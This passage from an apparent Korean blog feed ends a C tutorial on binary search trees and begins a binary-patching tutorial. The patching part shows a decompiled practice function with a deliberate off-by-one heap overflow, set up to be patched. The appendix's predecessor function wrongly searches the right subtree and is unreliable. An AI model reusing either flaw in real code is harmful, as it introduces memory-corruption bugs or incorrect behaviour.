encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>의 오른쪽 자식을 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> 위치에 대입합니다. 이후 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>를 삭제할 노드 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq> 위치에 대입한 후, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>의 오른쪽 자식 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>과 연결해줍니다. 앞서 말했듯 다음 노드 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>는 왼쪽 자식이 없어, 두 작업 모두 전혀 문제가 되지 않습니다.</p>
<p><img src="/images/binary-search-tree/9.png" alt="9.png"></p>
<p>삭제 연산은 모든 경우에서 노드를 다른 노드의 위치에 대입하는 작업이 필요합니다. 따라서 먼저 대입을 위한 내장 함수 <code>__transplant</code> 를 구현하겠습니다. 이 함수는 노드 <code>v</code> 를 노드 <code>u</code> 위치에 대입한 후, 기존 노드 <code>u</code> 의 부모가 새로운 노드 <code>v</code> 를 자식으로 갖도록 합니다. 다만 새로운 노드 <code>v</code> 의 자식 포인터들을 연결하는 작업은 하지 않아, 함수를 호출한 쪽에서 직접 해야 합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line">	<span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;			<span class="comment">// u가 루트 노드인 경우</span></span><br><span class="line">		bst-&gt;root = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;	<span class="comment">// u가 왼쪽 자식이었다면</span></span><br><span class="line">		u-&gt;parent-&gt;left = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;							<span class="comment">// u가 오른쪽 자식이었다면</span></span><br><span class="line">		u-&gt;parent-&gt;right = v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		v-&gt;parent = u-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이제 <code>__transplant</code> 함수를 이용해서 삭제 함수를 편하게 구현할 수 있습니다. 삭제 연산을 위한 <code>delete</code> 함수는 키 <code>key</code> 를 받아, 내장 함수 <code>__tree_search</code> 를 호출하여 삭제할 노드 <code>x</code> 를 찾고 삭제합니다. 4행과 6행은 삭제할 노드 <code>x</code> 의 자식이 없거나 하나인 경우로, <code>__transplant</code> 함수를 호출해 자식 또는 <code>NULL</code> 을 <code>x</code> 위치에 대입합니다.</p>
<p>9행은 <code>x</code> 의 자식이 둘인 경우입니다. 이 경우는 먼저 <code>x</code> 의 오른쪽 트리에서 다음 노드 <code>y</code> 를 찾습니다. 11행은 <code>y</code> 가 <code>x</code> 의 오른쪽 자식이 아닌 경우로, 위의 그림과 같이 <code>y</code> 의 오른쪽 자식을 <code>y</code> 위치에 대입시켜 놓습니다. 이후 <code>y</code> 가 <code>x</code> 의 오른쪽 자식 (그림에서 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>)의 부모가 되도록 연결합니다. 그러면 16행에서, 다음 노드가 <code>x</code> 의 오른쪽 자식인 경우와 똑같이 <code>y</code> 를 <code>x</code> 위치에 대입만 해주면 됩니다. 대입 후 <code>y</code> 의 자식에 대한 포인터 연결은 직접 해야 함에 유의합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;right);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;left);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y = __tree_min(x-&gt;right);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">			__transplant(bst, y, y-&gt;right);</span><br><span class="line">			y-&gt;right = x-&gt;right;</span><br><span class="line">			y-&gt;right-&gt;parent = y;</span><br><span class="line">		&#125;</span><br><span class="line">		__transplant(bst, x, y);</span><br><span class="line">		y-&gt;left = x-&gt;left;</span><br><span class="line">		y-&gt;left-&gt;parent = y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0" tabindex="-1">이진 탐색 트리 사용해보기</h2>
<p>이진 탐색 트리의 모든 연산을 구현했으니, 직접 사용해 봅시다. 아래는 <code>BST</code> 구조체를 사용하는 테스트 코드입니다. 5행은 이진 탐색 트리에 1부터 10까지의 키를 뒤죽박죽 삽입하고 출력합니다. 삽입은 그렇게 해도 출력은 작은 순서대로 잘 나와줍니다. 10행은 키 1~3을 삭제하고, 11~13을 새로 집어넣은 후 또 출력합니다. 이번에도 4부터 13까지 작은 순서대로 잘 출력됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">	BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./main </span><br><span class="line">1 1</span><br><span class="line">2 2</span><br><span class="line">3 3</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">11 11</span><br><span class="line">12 12</span><br><span class="line">13 13</span><br></pre></td></tr></table></figure>
<h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">결론</h2>
<p>이진 탐색 트리는 키-값 데이터를 정렬된 순서로 관리할 수 있고, 삽입과 삭제 등의 모든 연산을 이상적으로는 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> 시간에 처리할 수 있습니다. 하지만 트리의 형태에 따라 최악의 경우 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> 시간까지 걸릴 수 있습니다. 이 경우에는 선형 자료구조에 비해 별로 좋은 점이 없습니다.</p>
<p>따라서 집합이나 딕셔너리 등 컨테이너의 구현에는 트리의 형태를 효율적인 형태로 유지하도록 하는 알고리즘이 추가된 자가 균형(self-balancing) 이진 탐색 트리를 사용합니다. 실제로 리눅스의 <code>g++</code> 컴파일러가 사용하는 C++ 라이브러리를 동적 분석한 결과, <code>std::set</code> 의 구현에 자가 균형 이진 탐색 트리의 일종인 레드-블랙 트리(red-black tree)를 사용하고 있었다고 합니다.</p>
<p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c" rel="noopener" target="_blank"><div class="link-preview-widget-title">What is the underlying data structure of a STL set in C++?</div><div class="link-preview-widget-description">I would like to know how a set is implemented in C++. If I were to implement my own set container without using the STL provided container, what would be the best way to go about this task?

I unde...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c" rel="noopener" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] T.H. Corman, C.E. Leiserson, R.L. Rivest and C. Stein, “Binary Search Trees,” in <em>Introduction to Algorithms</em>, 3rd ed. Cambridge, MA: MIT Press, 2009, pp. 286-298.</p>
<h2 id="%EB%B6%80%EB%A1%9D" tabindex="-1">부록</h2>
<h3 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84-%EC%BD%94%EB%93%9C" tabindex="-1">이진 탐색 트리 구현 코드</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Definitions */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> key, value;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">	Node *root;</span><br><span class="line">&#125; BST;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Internal Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line">	<span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__tree_walk(x-&gt;left);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">		__tree_walk(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">		x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		x = x-&gt;left;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_max(Node *x) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		x = x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line">	<span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;			</span><br><span class="line">		bst-&gt;root = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;	</span><br><span class="line">		u-&gt;parent-&gt;left = v;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;							</span><br><span class="line">		u-&gt;parent-&gt;right = v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		v-&gt;parent = u-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Exposed Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">	__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">	Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">	Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		y = x;</span><br><span class="line">		x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;	<span class="comment">// bst is empty</span></span><br><span class="line">		bst-&gt;root = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">		y-&gt;left = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y-&gt;right = newnode;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;right);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__transplant(bst, x, x-&gt;left);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y = __tree_min(x-&gt;right);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">			__transplant(bst, y, y-&gt;right);</span><br><span class="line">			y-&gt;right = x-&gt;right;</span><br><span class="line">			y-&gt;right-&gt;parent = y;</span><br><span class="line">		&#125;</span><br><span class="line">		__transplant(bst, x, y);</span><br><span class="line">		y-&gt;left = x-&gt;left;</span><br><span class="line">		y-&gt;left-&gt;parent = y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Driver Code */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">	BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">	delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">	insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">	print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Computer Science</category>
        <category>Data Structures</category>
      </categories>
  </entry>
  <entry>
    <title>바이너리 패치</title>
    <url>/2022/11/27/binary-patching/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>바이너리 패치의 의미와 방법을 살펴보고, 코드 수정과 삽입을 통해 취약점을 패치해 보겠습니다.</p>
<h2 id="%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%ED%8C%A8%EC%B9%98" tabindex="-1">바이너리 패치</h2>
<p>바이너리 패치(binary patching)란 바이너리의 내용을 수정하여 다르게 동작하도록 하는 과정을 의미합니다. 바이너리 패치는 소스 코드의 확보가 제한되는 바이너리를 대상으로 분석이나 연구, 또는 취약점을 보완할 필요가 있는 상황에서 유용합니다. 예를 들어 사물인터넷(IoT) 장치의 펌웨어에서 제조사가 패치하지 못한 취약점을 자체적으로 보완하여 사용하거나, 디버거를 탐지하면 종료하는 등 분석을 방해하는 악성 코드의 기능을 무력화하기 위해 바이너리 패치 기술을 사용할 수 있습니다.</p>
<h3 id="%EB%B0%A9%EB%B2%95%EB%A1%A0" tabindex="-1">방법론</h3>
<p>바이너리 패치는 바이너리의 동작을 얼마나 변형할 것인지에 따라 다양한 방법을 사용할 수 있습니다. 아주 사소한 버그를 수정하거나, 일부 코드를 무력화하는 등 기존의 동작을 조금 변형하는 정도라면 헥스 에디터를 이용하여 해당하는 인스트럭션을 수정하는 것으로도 충분합니다. 그러나 특정 함수의 동작 자체를 수정하거나, 원하는 코드를 추가적으로 실행하는 등 변형의 정도가 큰 경우에는 코드를 삽입하기 위한 다양한 방법을 사용해야 합니다.</p>
<p>이 글에서는 예제 바이너리에 존재하는 두 가지 취약점을 패치하는 상황을 가정하고, 헥스 에디터를 이용한 간단한 수정과 코드를 삽입하여 패치하는 방법을 모두 연습해 보겠습니다. 실습에 사용할 바이너리는 다음 링크에서 내려받을 수 있습니다.<br>
<a href="/uploads/binary-patching/example.zip">example.zip</a></p>
<h2 id="%EA%B0%84%EB%8B%A8%ED%95%9C-%EC%88%98%EC%A0%95%EC%9D%98-%EA%B2%BD%EC%9A%B0" tabindex="-1">간단한 수정의 경우</h2>
<p>바이너리의 동작을 조금만 변형하는 간단한 수정의 경우, 헥스 에디터를 사용하는 방법이 직관적이고 간편합니다. 헥스 에디터를 사용하는 방법은 기초적인 도구만으로도 간편하게 패치를 할 수 있다는 장점이 있습니다. 패치의 과정은 먼저 디스어셈블러를 이용해 패치할 코드와 위치를 확인한 후, 헥스 에디터로 바이너리를 열고 해당 위치의 인스트럭션을 원하는 인스트럭션으로 덮어씁니다. 아래 그림은 헥스 에디터를 사용하여 특정 함수의 호출을 무력화하는 간단한 수정의 예시를 나타내고 있습니다.</p>
<p><img src="/images/binary-patching/1.png" alt="1.png"></p>
<p>다만 이 방법은 패치할 부분을 제외한 나머지 바이트들이 제자리에 위치한 상태에서만 수정이 가능하다는 분명한 한계가 있습니다. 예를 들어 원래의 인스트럭션보다 수정할 인스트럭션의 길이가 길다면, 인스트럭션을 덮어쓸 때 이후의 인스트럭션 내용까지 덮어쓰게 되어 바이너리가 정상 동작하지 않을 수 있습니다. 코드 섹션의 사용하지 않는 여유 공간에 새로운 코드를 추가할 수도 있겠지만, 대부분의 바이너리는 코드를 추가할 만큼 충분한 여유 공간을 가지고 있지 않습니다.</p>
<h3 id="off-by-one-%EB%B2%84%EA%B7%B8-%ED%8C%A8%EC%B9%98%ED%95%98%EA%B8%B0" tabindex="-1">off-by-one 버그 패치하기</h3>
<p>바이너리에 존재하는 off-by-one 버그를 헥스 에디터를 사용한 방법으로 패치해 보겠습니다. 압축 파일에서 <code>example1/main</code> 파일이 패치할 바이너리입니다. 바이너리를 실행하면 add, delete, show 등의 메뉴를 확인할 수 있고, 각각의 메뉴를 선택해 보면 사용자로부터 문자열을 입력받아 관리하고 보여주는 프로그램임을 짐작할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<p>add 메뉴에 해당하는 <code>add_data</code> 함수를 디컴파일하면 다음과 같습니다. 11행에서 길이를 입력받고, 16보다 작거나 같으면 14행에서 20바이트 크기의 구조체를 할당한 후 오프셋 16에 길이를 저장합니다. 17행의 반복문에서는 입력받은 길이만큼 1바이트씩 문자를 입력받아 구조체의 오프셋 0에서부터 저장하는 것처럼 보입니다. 20행의 조건문은 입력받은 문자가 개행 문자면 널(null) 문자로 바꾼 후 반복문을 탈출하도록 합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_DWORD *<span class="title function_">add_data</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+7h] [rbp-19h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;length: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br><span class="line">    v4[<span class="number">4</span>] = v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;contents: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= v2; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_BYTE *)v4 + (<span class="type">int</span>)i) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> v4;</span><br><span class="line">      